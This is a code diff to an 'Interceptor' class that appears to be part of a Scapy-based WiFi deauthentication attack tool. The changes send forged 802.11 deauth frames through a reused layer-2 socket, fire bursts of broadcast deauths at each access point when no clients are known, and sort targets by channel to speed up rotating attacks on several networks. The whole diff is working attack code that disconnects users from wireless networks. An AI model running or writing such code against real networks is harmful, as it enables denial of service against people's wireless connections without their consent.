@@ -41,6 +41,7 @@ class Interceptor:
     _ABORT = False
     _PRINT_STATS_INTV = 1
     _DEAUTH_INTV = 0.100  # 100[ms]
+    _DEAUTH_BURST = 5  # consecutive broadcast deauths per AP per loop (when no clients are known)
     _CH_SNIFF_TO = 2
     _SSID_STR_PAD = 42  # total len 80
 
@@ -56,6 +57,7 @@ class Interceptor:
         self.attack_loop_count = 0
 
         self._target_ssids: List[SSID] = list()
+        self._l2_sock = None  # reused socket, avoids per-packet socket setup of sendp()
         self._debug_mode = debug_mode
 
         if not skip_monitor_mode_setup:
@@ -351,6 +353,11 @@ class Interceptor:
     def _get_target_clients(self, ssid: SSID) -> List[str]:
         return self._custom_target_client_mac or ssid.clients
 
+    def _get_l2_socket(self):
+        if self._l2_sock is None:
+            self._l2_sock = conf.L2socket(iface=self.interface)
+        return self._l2_sock
+
     def _run_deauther(self):
         try:
             print_info(f"Starting de-auth loop...")
@@ -366,10 +373,14 @@ class Interceptor:
                         if not self._deauth_all_channels and self._current_channel_num != ssid.channel:
                             self._set_channel(ssid.channel)
                         ap_mac = ssid.mac_addr
-                        for client_mac in self._get_target_clients(ssid):
+                        target_clients = self._get_target_clients(ssid)
+                        for client_mac in target_clients:
                             self._send_deauth_client(ap_mac, client_mac)
                         if not self._custom_target_client_mac:
-                            self._send_deauth_broadcast(ap_mac)
+                            # burst broadcast deauths when no clients are known yet,
+                            # keeps per-AP packet density when rotating multiple targets
+                            self._send_deauth_broadcast(ap_mac,
+                                                        burst=1 if target_clients else Interceptor._DEAUTH_BURST)
                     failed_attempts_ctr = 0  # reset counter
                 except Exception as exc:
                     failed_attempts_ctr += 1
@@ -378,25 +389,33 @@ class Interceptor:
                     sleep(Interceptor._DEAUTH_INTV)  # if exception - sleep to throttle down
         except Exception as exc:
             Interceptor.abort_run(f"Exception '{exc}' in deauth-loop -> {traceback.format_exc()}")
+        finally:
+            if self._l2_sock is not None:
+                try:
+                    self._l2_sock.close()
+                except Exception:
+                    pass
+                self._l2_sock = None
 
     def _send_deauth_client(self, ap_mac: str, client_mac: str):
-        sendp(RadioTap() /
-              Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
-              Dot11Deauth(reason=7),
-              iface=self.interface)
-        sendp(RadioTap() /
-              Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
-              Dot11Deauth(reason=7),
-              iface=self.interface)
+        sock = self._get_l2_socket()
+        sock.send(RadioTap() /
+                  Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
+                  Dot11Deauth(reason=7))
+        sock.send(RadioTap() /
+                  Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
+                  Dot11Deauth(reason=7))
 
-    def _send_deauth_broadcast(self, ap_mac: str):
-        sendp(RadioTap() /
-              Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
-              Dot11Deauth(reason=7),
-              iface=self.interface)
+    def _send_deauth_broadcast(self, ap_mac: str, burst: int = 1):
+        sock = self._get_l2_socket()
+        pkt = RadioTap() / Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
+        for _ in range(burst):
+            sock.send(pkt)
 
     def run(self):
         self._target_ssids = self._start_initial_ap_scan()
+        # sort targets by channel so same-channel APs are attacked back-to-back (minimal channel hops)
+        self._target_ssids.sort(key=lambda ssid: ssid.channel)
         print_info(f"Attacking {len(self._target_ssids)} target(s) in rotation:")
         for ssid in self._target_ssids:
             print_info(f"  -> {BOLD}{ssid.name}{RESET} ({ssid.mac_addr}) on channel {ssid.channel}")
